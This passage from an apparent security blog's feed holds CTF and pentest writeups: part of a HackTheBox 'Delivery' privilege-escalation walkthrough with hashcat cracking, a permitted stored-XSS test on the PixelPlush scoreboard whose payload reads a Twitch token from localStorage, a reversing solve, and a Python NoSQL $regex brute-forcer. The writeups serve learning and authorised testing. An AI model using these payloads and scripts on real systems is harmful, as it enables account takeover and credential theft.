+<p>It worked, on the page we now see a ticket id and an email. Awesome we get an <code class="language-plaintext highlighter-rouge">@delivery.htb</code> mail address, also what gets send to it will be displayed in the ticket.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/helpdesk-ticketwithoutconfirmationmail.png" alt="" /></p>
+
+<p>Now make an account using the email address you got when making a ticket on mattermost.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/helpdesk-ticketwithconfirmationmail.png" alt="" /></p>
+
+<p>After this refresh the helpdesk page for the ticket and you should see something like this, a confirmation URL for the account. After opening the URL (make sure to use the full one), you will be redirected to the login page.</p>
+
+<p>Login using the password you chose.
+We are in it asked for the teams we want to join, lets click on <em>Internal</em>.And we are in and can read the chat.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/mattermost-mainchat.png" alt="" /></p>
+
+<h2 id="gaining-shell">Gaining Shell</h2>
+
+<p>At the top of the chat we see a message that says</p>
+
+<div class="language-markdown highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@developers Please update theme to the OSTicket before we go live. Credentials to the server are maildeliverer:Youve_G0t_Mail! 
+</code></pre></div></div>
+
+<p>It gives us credentials for SSH, <code class="language-plaintext highlighter-rouge">Username: maildeliverer</code> and <code class="language-plaintext highlighter-rouge">Password: Youve_G0t_Mail!</code>.</p>
+
+<p>After logging in, we can get the flag!</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span>
+<span class="c"># lse.sh  mattermost.txt  user.txt</span>
+<span class="nb">cat </span>user.txt
+<span class="c"># REDACTED</span>
+</code></pre></div></div>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>In the home directory there is a <code class="language-plaintext highlighter-rouge">.mysql_history</code> file, this tells us there is a MySQL server running. The MySQL server may also contain password hashes.
+Now lets see if we can find the credentials for it. Maybe inside the mattermost configuration file, it can be found in <code class="language-plaintext highlighter-rouge">/opt/mattermost/config/config.json</code></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"SqlSettings"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"DriverName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mysql"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"DataSource"</span><span class="p">:</span><span class="w"> </span><span class="s2">"mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8</span><span class="se">\u</span><span class="s2">0026readTimeout=30s</span><span class="se">\u</span><span class="s2">0026writeTimeout=30s"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Yup it is in the configuration file, <code class="language-plaintext highlighter-rouge">Username: mmuser</code> and <code class="language-plaintext highlighter-rouge">Password: Crack_The_MM_Admin_PW</code>.</p>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Lets connect to MySQL and see what we can find.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql <span class="nt">-u</span> mmuser <span class="nt">-p</span> <span class="nt">-D</span> mattermost
+<span class="c"># Enter password: Crack_The_MM_Admin_PW</span>
+<span class="c"># MariaDB [mattermost]&gt; </span>
+</code></pre></div></div>
+
+<p>So now that we are in MySQL, lets check what tables we have.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/mysql-tables.png" alt="" /></p>
+
+<p>The table <em>Users</em> looks interesting, this may contain the passwords.</p>
+
+<p><img src="/assets/CTFs/HTB/Delivery/mysql-tables-user.png" alt="" /></p>
+
+<p>Lets run the following query to see what’s in the table</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">Users</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/CTFs/HTB/Delivery/mysql-usertable.png" alt="" />
+Looks like it has a username and password field. Lets select those, where the username is <em>ROOT</em></p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="n">username</span><span class="p">,</span><span class="n">password</span> <span class="k">FROM</span> <span class="n">Users</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'root'</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="/assets/CTFs/HTB/Delivery/mysql-rootpassword.png" alt="" /></p>
+
+<p>And we find the password hash for the root user. 
+<code class="language-plaintext highlighter-rouge">username: root</code> and <code class="language-plaintext highlighter-rouge">password: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO</code></p>
+
+<p>Lets start cracking that hash. We can find in the chat that the password is a variant of <em>PleaseSubscribe!</em>.</p>
+
+<blockquote>
+  <p>Also please create a program to help us stop re-using the same passwords everywhere…. Especially those that are a variant of “PleaseSubscribe!”
+PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.</p>
+</blockquote>
+
+<p>Put the hash into a file <code class="language-plaintext highlighter-rouge">root.hash</code> and put <code class="language-plaintext highlighter-rouge">PleaseSubscribe!</code> into a file <code class="language-plaintext highlighter-rouge">root.dict</code>.</p>
+
+<p>And use the following command.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>hashcat <span class="nt">-w</span> 1 <span class="nt">-a</span> 0 <span class="nt">-m</span> 3200 root.hash root.dict <span class="nt">-r</span> /usr/share/hashcat/rules/best64.rule
+</code></pre></div></div>
+<p>What does this command do?</p>
+
+<ul>
+  <li>It sets the hash type to 3200, this is bcrypt.</li>
+  <li>It sets the attack mode to 0, this is straight and will only use the wordlist and apply the rule file.</li>
+  <li>It sets the workload profile to 1, this is the lowest one and perfect for my VM.</li>
+  <li>It uses hash from the <code class="language-plaintext highlighter-rouge">root.hash</code> file.</li>
+  <li>It uses the password from the <code class="language-plaintext highlighter-rouge">root.dict</code> file.</li>
+  <li>It uses the <code class="language-plaintext highlighter-rouge">/usr/share/hashcat/rules/best64.rule</code> file for the password rules.</li>
+</ul>
+
+<p>After a few minutes this will return with a password and it is <code class="language-plaintext highlighter-rouge">PleaseSubscribe!21</code>.</p>
+
+<p>Lets switch to the root user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su
+<span class="c"># password:</span>
+<span class="nb">cat</span> /root/root.txt
+<span class="c"># REDACTED</span>
+</code></pre></div></div>]]></content><author><name>daanbreur</name></author><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="passwordreuse" /><category term="misconfiguration" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">[Writeup] Pentesting | XSS in the Pixelplush Scoreboard</title><link href="https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html" rel="alternate" type="text/html" title="[Writeup] Pentesting | XSS in the Pixelplush Scoreboard" /><published>2021-05-25T00:00:00+00:00</published><updated>2021-05-25T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS</id><content type="html" xml:base="https://blog.daanbreur.systems/2021/05/25/PixelPlush-Scoreboard-XSS.html"><![CDATA[<p>This writeup is about the <strong>XSS in the <a href="https://pixelplush.dev">PixelPlush</a> Scoreboard</strong>.</p>
+
+<p>NOTE: Please always ask for permissions when pentesting a website!</p>
+
+<p>When I decided to pentest <a href="https://pixelplush.dev">PixelPlush</a> (ofcourse with permission), I was looking for possible vulnerable endpoints that possibly reflect data into a page. I saw that the site has a scoreboard for the Parachute game, and decided this is a nice place to start.</p>
+
+<p>First I took a look at the requests the page made, This one stood out.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-scores.png" alt="" /></p>
+
+<p>It returns JSON, In this case an array with objects that contain the username, the score and the user-id.</p>
+
+<p>I will provide a example object below.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"13371337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"leethaxor"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"leethaxor"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mf">99.99</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-13T17:16:29.468Z"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"updated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-13T17:16:29.468Z"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now we need to know the endpoint that submits the points.</p>
+
+<p>We can simply do this by starting the overlay ourselves and playing it, while having burp open to capture any requests it makes. Finally after a few tries I win some points and a request is made.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/post-add-score.png" alt="" /></p>
+
+<p>The data being send is a JSON Object (sample down below)</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"parachute"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PortaalGaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"92.98"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The URL its being send to is https://api.pixelplush.dev/v1/scores/add</p>
+
+<p>Lets send this request to the repeater in Burp Suite. First we can test changing the score count over 100, cause 100 is the limit of the game.</p>
+
+<p>Lets send the following request</p>
+
+<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/v1/scores/add</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="p">:</span> <span class="s">api.pixelplush.dev</span>
+<span class="na">Content-Length</span><span class="p">:</span> <span class="s">206</span>
+<span class="na">Sec-Ch-Ua</span><span class="p">:</span> <span class="s">" Not A;Brand";v="99", "Chromium";v="90", "Microsoft Edge";v="90"</span>
+<span class="na">Dnt</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Sec-Ch-Ua-Mobile</span><span class="p">:</span> <span class="s">?0</span>
+<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Edg/90.0.818.66</span>
+<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/plain;charset=UTF-8</span>
+<span class="na">Accept</span><span class="p">:</span> <span class="s">*/*</span>
+<span class="na">Origin</span><span class="p">:</span> <span class="s">https://www.pixelplush.dev</span>
+<span class="na">Sec-Fetch-Site</span><span class="p">:</span> <span class="s">same-site</span>
+<span class="na">Sec-Fetch-Mode</span><span class="p">:</span> <span class="s">cors</span>
+<span class="na">Sec-Fetch-Dest</span><span class="p">:</span> <span class="s">empty</span>
+<span class="na">Referer</span><span class="p">:</span> <span class="s">https://www.pixelplush.dev/</span>
+<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
+<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.9,nl;q=0.8</span>
+<span class="na">Sec-Gpc</span><span class="p">:</span> <span class="s">1</span>
+<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
+
+{"token":"REDACTED","channel":"portaalgaming","game":"writeup","theme":"Pixel Parachute (Day)","user":"PortaalGaming","score":"999999","userId":"244294836","username":"portaalgaming"}
+</code></pre></div></div>
+
+<p>When we now open the page (or send a request to the points endpoint). And yes it set the amount of points, to over 100.</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/get-scoreboard-faked-points.png" alt="" /></p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="w">
+  </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"PortaalGaming"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="mi">999999</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"created"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-25T08:17:56.807Z"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"updated"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2021-05-25T08:17:56.807Z"</span><span class="w">
+  </span><span class="p">}</span><span class="w">
+</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Now that we know the score isn’t safe, lets try to inject html into the user field. Maybe it will work.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"writeup"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;b&gt;PortaalGaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And the server returns with</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w"> </span><span class="nl">"success"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Nice, it injected the code into the website. (Please note that this now has been fixed and you cant exploit it anymore)</p>
+
+<p>Now lets inject some JavaScript to alert your twitch token. The twitch token is saved inside of the localStorage.</p>
+
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"token"</span><span class="p">:</span><span class="w"> </span><span class="s2">"REDACTED"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"channel"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"game"</span><span class="p">:</span><span class="w"> </span><span class="s2">"writeup"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"theme"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Pixel Parachute (Day)"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"&lt;script&gt;alert('H4x3d by Daanbreur. Your twitch token is: '+localStorage.getItem('twitchToken'))&lt;/script&gt;"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"score"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1337"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"userId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"244294836"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"portaalgaming"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And if you now open the website, navigate to the scoreboard and open my page, you would have been greeted with an alert that told your twitch token!</p>
+
+<p><img src="/assets/CTFs/Pentesting/PixelPlush-Scoreboard-XSS/xss-alert.png" alt="" /></p>
+
+<p><strong>Big Thanks to <a href="https://twitch.tv/instafluff">Instafluff</a> Creator of Pixelplush for letting me pentest the website and write this writeup!</strong></p>]]></content><author><name>daanbreur</name></author><category term="xss" /><category term="pixelplush" /><summary type="html"><![CDATA[This writeup is about the XSS in the PixelPlush Scoreboard.]]></summary></entry><entry><title type="html">[Writeup] CyberApocolypse 2021 | Authenticator</title><link href="https://blog.daanbreur.systems/2021/04/24/CA2021-Authenticator.html" rel="alternate" type="text/html" title="[Writeup] CyberApocolypse 2021 | Authenticator" /><published>2021-04-24T00:00:00+00:00</published><updated>2021-04-24T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2021/04/24/CA2021-Authenticator</id><content type="html" xml:base="https://blog.daanbreur.systems/2021/04/24/CA2021-Authenticator.html"><![CDATA[<p>Solves: 988 | Points: 300</p>
+
+<p>We find a zip file with one file inside of it. When using <code class="language-plaintext highlighter-rouge">file ./authenticator</code> we can see its a ELF binary</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file ./authenticator
+</code></pre></div></div>
+<pre><code class="language-log">authenticator: ELF 64-bit LSB shared object, x86-64, 
+version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, 
+for GNU/Linux 3.2.0, BuildID[sha1]=66286657ca5a06147189b419238b2971b11c72db, not stripped
+</code></pre>
+
+<p>Lets open it in ghidra and use the decompiler</p>
+
+<p><img src="/assets/CTFs/CyberApocolypse2021/Authenticator/ghidra.png" alt="" class="modal" /></p>
+
+<p>Now that we have the file open in ghidra lets search for the <em>main</em> function and open it in the decompiler.</p>
+
+<p><img src="/assets/CTFs/CyberApocolypse2021/Authenticator/ghidra_decompiled_main.png" alt="" class="modal" /></p>
+
+<p>we see it will ask for a passcode thats our goal lets go the the function <em>checkpin</em>, that is being called with our input.</p>
+
+<p><img src="/assets/CTFs/CyberApocolypse2021/Authenticator/ghirda_decompiled_checkpin.png" alt="" class="modal" /></p>
+
+<p>Hmm lets make it more readable by rename variables.
+It looks like it will loop over the length of the string and check if <code class="language-plaintext highlighter-rouge">"}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:"[index] ^ 9U</code> is equal to the character on the input, if not it will break and return 1.
+return 1 in the main function is incorrect pincode, lets make a loop to decode that string</p>
+
+<p><img src="/assets/CTFs/CyberApocolypse2021/Authenticator/ghidra_decompiled_checkpin_annotated.png" alt="" class="modal" /></p>
+
+<p>I am going to use cpp because i only have to change a few lines from the checkpin function to make it work.</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span>
+<span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">index</span><span class="p">;</span>
+  <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">index</span> <span class="o">&gt;</span> <span class="mi">42</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">((</span><span class="s">"}a:Vh|}a:g}8j=}89gV&lt;p&lt;}:dV8&lt;Vg9}V&lt;9V&lt;:j|{:"</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="o">^</span> <span class="mi">9U</span><span class="p">));</span>
+    <span class="n">index</span> <span class="o">=</span> <span class="n">index</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>^ A download for this script can be found <a href="/assets/CTFs/CyberApocolypse2021/Authenticator/solver.cpp" class="modal">here</a></p>
+
+<p>This code will go over every character in that encoded string and doing an XOR with 9U. then it will cast that to an char and printing it to the console.</p>
+
+<p>lets run the code and we get our flag, fill in in between CHTB{} and you get <strong>CHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}</strong></p>
+
+<p>Thanks for reading my writeup :)</p>]]></content><author><name>daanbreur</name></author><category term="reversing" /><category term="encryption" /><summary type="html"><![CDATA[Solves: 988 | Points: 300]]></summary></entry><entry><title type="html">[Writeup] CyberApocolypse 2021 | Wild Goose Hunt</title><link href="https://blog.daanbreur.systems/2021/04/24/CA2021-WildGooseHunt.html" rel="alternate" type="text/html" title="[Writeup] CyberApocolypse 2021 | Wild Goose Hunt" /><published>2021-04-24T00:00:00+00:00</published><updated>2021-04-24T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2021/04/24/CA2021-WildGooseHunt</id><content type="html" xml:base="https://blog.daanbreur.systems/2021/04/24/CA2021-WildGooseHunt.html"><![CDATA[<p>Solves: 515 | Points: 300</p>
+
+<p>The webpage is just an username and password input field. 
+After checking the source that we could download we were able to discover that the password of the admin user is also the <em>flag</em>.
+Also we see that its a <em>mongodb database</em>, Maybe we have to do some <em>nosqlinjection</em>, after using burp to check the request we see its not using json but urlencoded formdata.</p>
+
+<p>After searching for a poc i found that you can use <code class="language-plaintext highlighter-rouge">password[%24regex]=</code> to check with an regex, if you just use <code class="language-plaintext highlighter-rouge">^.*</code> as regex it will pass because it matches everything.
+This way we can leak the password because if you put a character that isn’t in in that place in the password in front of the <code class="language-plaintext highlighter-rouge">.*</code> it will fail, if its in the password it will pass.</p>
+
+<p>Now we can bruteforce this, i made a little script using python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span><span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">workString</span> <span class="o">=</span> <span class="s">''</span>
+<span class="n">ip</span> <span class="o">=</span> <span class="s">'188.166.145.178'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="mi">31336</span>
+<span class="n">Solved</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="n">allowed</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s">'!_-@{}'</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="n">Solved</span> <span class="o">!=</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">currentChar</span> <span class="ow">in</span> <span class="n">allowed</span><span class="p">:</span>
+        <span class="n">testString</span> <span class="o">=</span> <span class="n">workString</span><span class="o">+</span><span class="n">currentChar</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"curl -s -k -X 'POST' -H 'Host: </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">' -H 'Content-Type: application/x-www-form-urlencoded;charset=UTF-8' -H 'Accept: */*' -H 'Origin: http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">' -H 'Referer: http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: en-US,en;q=0.9' -H 'Connection: close' --data-binary 'username=admin&amp;password[%24regex]=%5E</span><span class="si">{</span><span class="n">testString</span><span class="si">}</span><span class="s">.*' http://</span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">port</span><span class="si">}</span><span class="s">/api/login"</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">jsonData</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+        <span class="k">print</span><span class="p">(</span> <span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="s">'+'</span> <span class="k">if</span> <span class="n">jsonData</span><span class="p">[</span><span class="s">'logged'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="s">'-'</span><span class="si">}</span><span class="s">] Trying: '</span><span class="si">{</span><span class="n">workString</span><span class="si">}</span><span class="s">' + '</span><span class="si">{</span><span class="n">currentChar</span><span class="si">}</span><span class="s">' (</span><span class="si">{</span><span class="n">testString</span><span class="si">}</span><span class="s">) | isCorrect: </span><span class="si">{</span><span class="s">'True'</span> <span class="k">if</span> <span class="n">jsonData</span><span class="p">[</span><span class="s">'logged'</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span> <span class="k">else</span> <span class="s">'False'</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">jsonData</span><span class="p">[</span><span class="s">"logged"</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+            <span class="n">workString</span><span class="o">+=</span><span class="n">currentChar</span>
+            <span class="k">if</span> <span class="n">currentChar</span> <span class="o">==</span> <span class="s">'}'</span><span class="p">:</span> <span class="n">Solved</span> <span class="o">=</span> <span class="bp">True</span>
+            <span class="k">break</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[FLAG] The flag is: </span><span class="si">{</span><span class="n">workString</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>^ A download for this script can be found <a href="/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solve.py">here</a></p>
+
+<p>Now that the solver is running ill explain what it does.
+<img src="/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solver_running.png" alt="" class="modal" /></p>
+
+<p>This code will loop over every character, if the character is correct than it will add it to the working password.
+Then it will go the the next place in the password and try every character, until the last character is found.
+It knows if its correct by checking if the <code class="language-plaintext highlighter-rouge">logged</code> value in the returned jsondata is <code class="language-plaintext highlighter-rouge">1</code>.</p>
+
+<p>After running the script it found the flag.
+<strong>CHTB{1_th1nk_the_4l1ens_h4ve_n0t_used_m0ng0_b3f0r3}</strong> 
+<img src="/assets/CTFs/CyberApocolypse2021/WideGooseHunt/solver_done.png" alt="" class="modal" /></p>
+
+<p>Thanks for reading my writeup!</p>
+
+<hr />
+<p>sources: <a href="https://infosecwriteups.com/nosql-injection-8732c2140576">NOSQL INJECTION OPERATORS</a></p>]]></content><author><name>daanbreur</name></author><category term="web" /><category term="nosqlinjection" /><category term="mongodb" /><summary type="html"><![CDATA[Solves: 515 | Points: 300]]></summary></entry><entry><title type="html">[Writeup] TryHackMe | VulnNet: dotpy</title><link href="https://blog.daanbreur.systems/2021/04/11/thm-vulnnetDotpy.html" rel="alternate" type="text/html" title="[Writeup] TryHackMe | VulnNet: dotpy" /><published>2021-04-11T00:00:00+00:00</published><updated>2021-04-11T00:00:00+00:00</updated><id>https://blog.daanbreur.systems/2021/04/11/thm-vulnnetDotpy</id><content type="html" xml:base="https://blog.daanbreur.systems/2021/04/11/thm-vulnnetDotpy.html"><![CDATA[<h2 id="room-information">Room Information</h2>
+
+<p>Title: VulnNet: dotpy<br />
+Description: VulnNet Entertainment is back with their brand new website… and stronger?<br />
+This room is availiable at <a href="https://tryhackme.com/room/vulnnetdotpy">TryHackMe VulnNet:Dotpy</a> or go to <a href="https://tryhackme.com/">TryHackMe</a>.</p>
+
+<h2 id="ports">Ports</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT     STATE SERVICE
+8080/tcp open  http-proxy
+</code></pre></div></div>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
